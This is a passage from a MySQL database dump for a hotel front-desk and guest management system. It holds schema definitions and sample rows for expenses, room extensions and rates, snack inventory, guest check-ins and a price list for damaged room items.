INSERT INTO `expense_categories` VALUES (3,1,'Foods','2025-11-19 14:54:33','2025-11-19 14:54:33'),(4,1,'Utilities','2025-11-19 14:54:43','2025-11-19 14:54:43');
/*!40000 ALTER TABLE `expense_categories` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `expenses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `expenses` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` bigint unsigned DEFAULT NULL,
  `shift` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `expense_category_id` bigint unsigned NOT NULL,
  `description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `amount` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `expenses_user_id_foreign` (`user_id`),
  CONSTRAINT `expenses_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE SET NULL
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `expenses` WRITE;
/*!40000 ALTER TABLE `expenses` DISABLE KEYS */;
INSERT INTO `expenses` VALUES (1,'Frontdesk',3,'AM',3,'nag bakal sang extra nga foods','1000','2025-11-19 14:55:32','2025-11-19 14:55:32'),(2,'Frontdesk',3,'PM',4,'naguba','2000','2025-11-19 14:56:21','2025-11-19 14:56:21');
/*!40000 ALTER TABLE `expenses` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `extended_guest_reports`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `extended_guest_reports` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `room_id` bigint unsigned NOT NULL,
  `checkin_details_id` bigint unsigned NOT NULL,
  `number_of_extension` int NOT NULL,
  `total_hours` int NOT NULL,
  `shift` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `frontdesk_id` int NOT NULL,
  `partner_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `extended_guest_reports` WRITE;
/*!40000 ALTER TABLE `extended_guest_reports` DISABLE KEYS */;
INSERT INTO `extended_guest_reports` VALUES (1,1,207,5,1,24,'AM',1,'Tan','2025-11-18 15:20:56','2025-11-18 15:20:56'),(2,1,208,6,1,24,'AM',1,'Tan','2025-11-18 15:22:35','2025-11-18 15:22:35'),(3,1,209,7,1,12,'AM',1,'Tan','2025-11-18 15:26:02','2025-11-18 15:26:02'),(4,1,127,8,1,12,'AM',1,'Tan','2025-11-18 15:27:55','2025-11-18 15:27:55'),(5,1,128,9,1,24,'AM',1,'Tan','2025-11-18 15:29:21','2025-11-18 15:29:21'),(6,1,210,10,1,6,'AM',1,'Tan','2025-11-18 15:34:56','2025-11-18 15:34:56'),(7,1,1,14,1,12,'AM',1,'Tan','2025-11-20 09:53:30','2025-11-20 09:53:30'),(8,1,7,15,4,36,'AM',1,'Tan','2025-11-20 10:30:23','2025-11-20 10:31:51'),(9,1,205,16,3,30,'AM',1,'Tan','2025-11-20 10:38:13','2025-11-20 10:46:03'),(10,1,3,18,1,18,'AM',1,'Tan','2025-11-20 11:15:55','2025-11-20 11:15:55'),(11,1,15,21,2,18,'AM',1,'Tan','2025-11-20 12:01:54','2025-11-20 12:58:00'),(12,1,2,20,2,12,'AM',1,'Tan','2025-11-20 12:58:17','2025-11-20 12:58:54'),(13,1,207,26,1,24,'PM',2,'Bhong','2025-11-21 20:34:30','2025-11-21 20:34:30'),(14,1,208,27,1,24,'PM',2,'Bhong','2025-11-21 20:50:00','2025-11-21 20:50:00'),(15,1,209,28,1,12,'PM',2,'Bhong','2025-11-21 20:54:10','2025-11-21 20:54:10'),(16,1,127,29,1,12,'PM',2,'Bhong','2025-11-21 20:57:15','2025-11-21 20:57:15'),(17,1,128,30,1,24,'PM',2,'Bhong','2025-11-21 21:00:09','2025-11-21 21:00:09'),(18,1,210,31,1,3,'PM',2,'Bhong','2025-11-21 21:06:06','2025-11-21 21:06:06'),(19,1,214,36,1,12,'PM',2,'Bhong','2025-11-21 21:37:10','2025-11-21 21:37:10'),(20,1,45,37,1,12,'PM',2,'Bhong','2025-11-21 21:40:25','2025-11-21 21:40:25');
/*!40000 ALTER TABLE `extended_guest_reports` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `extension_rates`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `extension_rates` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `hour` int NOT NULL,
  `amount` int NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `extension_rates` WRITE;
/*!40000 ALTER TABLE `extension_rates` DISABLE KEYS */;
INSERT INTO `extension_rates` VALUES (1,1,6,100,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(2,1,12,200,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(3,1,18,400,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(4,1,24,500,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(5,1,3,50,'2025-11-21 21:05:47','2025-11-21 21:05:47');
/*!40000 ALTER TABLE `extension_rates` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `failed_jobs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `failed_jobs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `uuid` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `connection` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `failed_jobs_uuid_unique` (`uuid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `failed_jobs` WRITE;
/*!40000 ALTER TABLE `failed_jobs` DISABLE KEYS */;
/*!40000 ALTER TABLE `failed_jobs` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `floor_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `floor_user` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint unsigned NOT NULL,
  `floor_id` bigint unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `floor_user_user_id_foreign` (`user_id`),
  KEY `floor_user_floor_id_foreign` (`floor_id`),
  CONSTRAINT `floor_user_floor_id_foreign` FOREIGN KEY (`floor_id`) REFERENCES `floors` (`id`) ON DELETE CASCADE,
  CONSTRAINT `floor_user_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `floor_user` WRITE;
/*!40000 ALTER TABLE `floor_user` DISABLE KEYS */;
INSERT INTO `floor_user` VALUES (1,7,1,NULL,NULL),(2,7,2,NULL,NULL),(3,7,3,NULL,NULL),(4,7,4,NULL,NULL),(5,7,5,NULL,NULL);
/*!40000 ALTER TABLE `floor_user` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `floors`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `floors` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `number` int NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `floors` WRITE;
/*!40000 ALTER TABLE `floors` DISABLE KEYS */;
INSERT INTO `floors` VALUES (1,1,1,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(2,1,2,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(3,1,3,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(4,1,4,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(5,1,5,'2025-11-18 14:23:00','2025-11-18 14:23:00');
/*!40000 ALTER TABLE `floors` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `frontdesk_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `frontdesk_categories` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `frontdesk_categories` WRITE;
/*!40000 ALTER TABLE `frontdesk_categories` DISABLE KEYS */;
INSERT INTO `frontdesk_categories` VALUES (1,1,'Snacks','2025-11-18 14:37:02','2025-11-18 14:37:02'),(2,1,'Drinks','2025-11-18 14:37:08','2025-11-18 14:37:08');
/*!40000 ALTER TABLE `frontdesk_categories` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `frontdesk_inventories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `frontdesk_inventories` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `frontdesk_menu_id` bigint unsigned NOT NULL,
  `number_of_serving` double NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `frontdesk_inventories` WRITE;
/*!40000 ALTER TABLE `frontdesk_inventories` DISABLE KEYS */;
INSERT INTO `frontdesk_inventories` VALUES (1,1,1,79,'2025-11-18 14:44:30','2025-11-21 21:41:39'),(2,1,2,0,'2025-11-18 14:44:34','2025-11-20 12:56:29'),(3,1,3,0,'2025-11-18 15:08:51','2025-11-20 12:55:40'),(4,1,4,99,'2025-11-18 15:08:55','2025-11-18 15:12:37'),(5,1,5,74,'2025-11-18 15:08:58','2025-11-21 21:41:49'),(6,1,2,20,'2025-11-20 13:15:28','2025-11-20 13:15:28'),(7,1,3,40,'2025-11-20 13:17:30','2025-11-20 13:17:30');
/*!40000 ALTER TABLE `frontdesk_inventories` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `frontdesk_menus`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `frontdesk_menus` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `frontdesk_category_id` bigint unsigned NOT NULL,
  `item_code` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `price` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `image` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `frontdesk_menus` WRITE;
/*!40000 ALTER TABLE `frontdesk_menus` DISABLE KEYS */;
INSERT INTO `frontdesk_menus` VALUES (1,1,1,'2003','Chippy','10','menu_images/zXOiIYhLM2Bstz70TkHotizrXp21s8oPgaaIDlJn.jpg','2025-11-18 14:43:21','2025-11-18 14:43:21'),(2,1,1,'130','Nissin Cup Noodles','30','menu_images/VVluefVT9TGLYNoGXHDE25xG6DUt3796pNqdJgfw.jpg','2025-11-18 14:44:13','2025-11-18 14:44:13'),(3,1,2,'2023','Coke Zero','15','menu_images/lJ94udBKRUWpcIArkLdcaP2yS1nCVkB4f41N2ClJ.jpg','2025-11-18 15:00:09','2025-11-18 15:00:09'),(4,1,2,'23121','C2','10','menu_images/TKXzl0HfetYB43nOJNSpCP6o3WPUKvY3OlWW49RW.jpg','2025-11-18 15:00:44','2025-11-18 15:00:44'),(5,1,2,'2313','Nature\'s Spring 10ML','15','menu_images/2t2kBZf9F5H84KNA0wAfsy2Dd5uNOwyEclE5utbl.png','2025-11-18 15:02:15','2025-11-18 15:02:15');
/*!40000 ALTER TABLE `frontdesk_menus` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `frontdesks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `frontdesks` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `number` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `frontdesks` WRITE;
/*!40000 ALTER TABLE `frontdesks` DISABLE KEYS */;
INSERT INTO `frontdesks` VALUES (1,1,'Bhong','1','2025-11-18 14:36:36','2025-11-18 14:36:36'),(2,1,'Tan','2','2025-11-18 15:02:29','2025-11-18 15:02:29');
/*!40000 ALTER TABLE `frontdesks` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `guests`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `guests` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `contact` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `qr_code` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `room_id` bigint unsigned NOT NULL,
  `previous_room_id` bigint unsigned DEFAULT NULL,
  `rate_id` bigint unsigned NOT NULL,
  `type_id` bigint unsigned NOT NULL,
  `static_amount` int NOT NULL,
  `is_long_stay` tinyint(1) NOT NULL DEFAULT '0',
  `number_of_days` int DEFAULT NULL,
  `has_discount` tinyint(1) NOT NULL DEFAULT '0',
  `discount_amount` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `has_kiosk_check_out` tinyint(1) NOT NULL DEFAULT '0',
  `is_co` tinyint(1) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=39 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `guests` WRITE;
/*!40000 ALTER TABLE `guests` DISABLE KEYS */;
INSERT INTO `guests` VALUES (1,1,'Marie Dela Cruz','N/A','1250001',17,NULL,3,1,760,0,0,0,'50.00',1,0,'2025-11-18 14:43:32','2025-11-19 08:44:00'),(2,1,'Pie Tzu','N/A','1250002',23,NULL,3,1,760,0,0,0,'50.00',1,0,'2025-11-18 14:44:15','2025-11-19 08:44:18'),(3,1,'Jose Pru','N/A','1250003',3,NULL,4,2,480,0,0,0,'50.00',1,0,'2025-11-18 14:44:58','2025-11-18 15:38:25'),(4,1,'Ela Ziu','N/A','1250004',6,NULL,4,2,480,0,0,0,'50.00',1,0,'2025-11-18 14:53:57','2025-11-18 15:38:38'),(5,1,'Kian Lee','N/A','1250005',207,NULL,9,3,872,0,0,0,'50.00',1,0,'2025-11-18 14:55:01','2025-11-20 08:52:01'),(6,1,'Shein Tan','N/A','1250006',208,NULL,3,1,760,0,0,0,'50.00',1,0,'2025-11-18 14:57:21','2025-11-20 09:02:03'),(7,1,'Carie Perry','N/A','1250007',209,NULL,2,1,536,0,0,0,'50.00',1,0,'2025-11-18 14:58:21','2025-11-19 08:44:52'),(8,1,'Inna Liu','N/A','1250008',127,NULL,8,3,648,0,0,0,'50.00',1,0,'2025-11-18 14:59:31','2025-11-19 08:46:14'),(9,1,'Ella Cy','N/A','1250009',128,NULL,6,2,816,0,0,0,'50.00',1,0,'2025-11-18 15:00:26','2025-11-20 08:59:11'),(10,1,'Ariel Lee','N/A','1250010',210,NULL,6,2,816,0,0,0,'50.00',1,0,'2025-11-18 15:01:08','2025-11-20 08:59:31'),(11,1,'test1','N/A','1250011',3,NULL,5,2,592,0,0,0,'50.00',1,0,'2025-11-19 09:41:38','2025-11-19 09:53:50'),(12,1,'testing lang','N/A','1250012',209,NULL,2,1,536,0,0,0,'50.00',1,0,'2025-11-19 15:06:41','2025-11-20 08:58:50'),(13,1,'tan','N/A','1250013',6,NULL,2,1,536,0,0,0,'50.00',1,0,'2025-11-19 15:37:57','2025-11-19 15:38:46'),(14,1,'zydie','N/A','1250014',1,17,2,1,536,0,0,0,'50.00',1,0,'2025-11-20 09:47:53','2025-11-20 10:13:26'),(15,1,'zydiiie','N/A','1250015',7,23,2,1,536,0,0,0,'50.00',1,0,'2025-11-20 10:16:17','2025-11-20 10:43:38'),(16,1,'Nino','N/A','1250016',205,207,8,3,648,0,0,0,'50.00',1,0,'2025-11-20 10:16:55','2025-11-20 10:55:00'),(17,1,'test','N/A','1250017',209,NULL,3,1,760,0,0,0,'50.00',1,0,'2025-11-20 10:54:18','2025-11-20 13:28:41'),(18,1,'t2','N/A','1250018',3,NULL,5,2,592,0,0,0,'50.00',1,0,'2025-11-20 10:55:30','2025-11-20 13:12:22'),(19,1,'t3','N/A','1250019',17,NULL,2,1,536,0,0,0,'50.00',1,0,'2025-11-20 11:09:33','2025-11-20 11:15:22'),(20,1,'t4','N/A','1250020',2,2,5,2,592,0,0,0,'50.00',1,0,'2025-11-20 11:09:49','2025-11-20 13:04:20'),(21,1,'t5','N/A','1250021',15,162,9,3,872,0,0,0,'50.00',1,0,'2025-11-20 11:10:15','2025-11-20 15:46:29'),(22,1,'nenyu','N/A','1250022',49,172,3,1,760,0,0,0,'50.00',1,0,'2025-11-20 13:10:27','2025-11-20 15:50:21'),(24,1,'test','N/A','1250023',89,1,4,2,480,0,0,0,'50.00',0,0,'2025-11-20 13:24:23','2025-11-20 14:46:15'),(25,1,'thian','N/A','1250024',34,44,3,1,560,0,0,0,NULL,1,1,'2025-11-20 14:10:58','2025-11-20 16:08:02'),(26,1,'unique','N/A','1250025',88,48,1,1,424,0,0,0,'50.00',1,0,'2025-11-20 16:09:28','2025-11-20 16:10:48'),(27,1,'Kian Lee','N/A','1250026',207,NULL,9,3,872,0,0,0,'50.00',0,0,'2025-11-21 20:31:42','2025-11-21 20:33:42'),(28,1,'Shein Tan','N/A','1250027',208,NULL,3,1,760,0,0,0,'50.00',1,0,'2025-11-21 20:48:15','2025-11-21 20:52:30'),(29,1,'Carie Perry','N/A','1250028',209,NULL,2,1,536,0,0,0,'50.00',0,0,'2025-11-21 20:53:23','2025-11-21 20:53:54'),(30,1,'Inna Liu','N/A','1250029',127,NULL,8,3,648,0,0,0,'50.00',0,0,'2025-11-21 20:56:13','2025-11-21 20:57:02'),(31,1,'Ella Cy','N/A','1250030',128,NULL,6,2,816,0,0,0,'50.00',1,0,'2025-11-21 20:59:30','2025-11-21 21:01:41'),(32,1,'Ariel Lee','N/A','1250031',210,NULL,6,2,816,0,0,0,'50.00',1,0,'2025-11-21 21:04:14','2025-11-21 21:06:59'),(33,1,'Ker Tan','N/A','1250032',211,NULL,2,1,536,0,0,0,'50.00',1,0,'2025-11-21 21:19:09','2025-11-21 21:19:42'),(34,1,'Ela Cruz','N/A','1250033',212,NULL,2,1,536,0,0,0,'50.00',1,0,'2025-11-21 21:28:11','2025-11-21 21:28:41'),(35,1,'Chun Wanta','N/A','1250034',35,NULL,8,3,648,0,0,0,'50.00',1,0,'2025-11-21 21:30:05','2025-11-21 21:30:42'),(36,1,'Gab Prie','N/A','1250035',213,NULL,8,3,648,0,0,0,'50.00',1,0,'2025-11-21 21:33:04','2025-11-21 21:34:51'),(37,1,'Cielo Shen','N/A','1250036',214,NULL,3,1,760,0,0,0,'50.00',1,0,'2025-11-21 21:36:15','2025-11-21 21:37:48'),(38,1,'Lorie Kiel','N/A','1250037',45,NULL,3,1,760,0,0,0,'50.00',0,0,'2025-11-21 21:39:47','2025-11-21 21:40:03');
/*!40000 ALTER TABLE `guests` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `hotel_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `hotel_items` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `price` int NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=40 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `hotel_items` WRITE;
/*!40000 ALTER TABLE `hotel_items` DISABLE KEYS */;
INSERT INTO `hotel_items` VALUES (1,1,'MAIN DOOR',5000,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(2,1,'PURTAHAN SA C.R.',2500,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(3,1,'SUGA SA ROOM',150,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(4,1,'SUGA SA C.R.',130,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(5,1,'SAMIN SULOD SA ROOM',1000,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(6,1,'SAMIN SULOD SA C.R.',1000,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(7,1,'SAMIN SA GAWAS',1500,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(8,1,'SALOG SA ROOM PER TILES',1200,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(9,1,'SALOG SA C.R. PER TILE',1200,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(10,1,'RUG/ TRAPO SA SALOG',40,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(11,1,'UNLAN',500,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(12,1,'HABOL',500,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(13,1,'PUNDA',200,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(14,1,'PUNDA WITH MANTSA(HAIR DYE)',500,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(15,1,'BEDSHEET WITH INK',500,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(16,1,'BED PAD WITH INK',800,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(17,1,'BED SKIRT WITH INK',1500,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(18,1,'TOWEL',300,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(19,1,'DOORKNOB C.R.',350,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(20,1,'MAIN DOOR DOORKNOB',500,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(21,1,'T.V.',30000,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(22,1,'TELEPHONE',1000,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(23,1,'DECODER PARA SA CABLE',1600,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(24,1,'CORD SA DECODER',100,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(25,1,'CHARGER SA DECODER',400,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(26,1,'WIRING SA TELEPHONE',100,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(27,1,'WIRINGS SA T.V.',200,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(28,1,'WIRING SA DECODER',50,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(29,1,'CEILING',0,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(30,1,'SHOWER HEAD',800,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(31,1,'SHOWER BULB',800,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(32,1,'BIDET',400,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(33,1,'HINGES/ TOWEL BAR',200,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(34,1,'TAKLOB SA TANGKE',1200,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(35,1,'TANGKE SA BOWL',3000,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(36,1,'TAKLOB SA BOWL',1000,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(37,1,'ILALOM SA LABABO',0,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(38,1,'SINK/LABABO',1500,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(39,1,'BASURAHAN',70,'2025-11-18 14:23:01','2025-11-18 14:23:01');
/*!40000 ALTER TABLE `hotel_items` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `inventories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `inventories` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `menu_id` bigint unsigned NOT NULL,
  `number_of_serving` double NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `inventories` WRITE;
/*!40000 ALTER TABLE `inventories` DISABLE KEYS */;
/*!40000 ALTER TABLE `inventories` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `jobs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `jobs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `queue` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `attempts` tinyint unsigned NOT NULL,
  `reserved_at` int unsigned DEFAULT NULL,
  `available_at` int unsigned NOT NULL,
  `created_at` int unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `jobs_queue_index` (`queue`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `jobs` WRITE;
/*!40000 ALTER TABLE `jobs` DISABLE KEYS */;
/*!40000 ALTER TABLE `jobs` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `menu_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `menu_categories` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
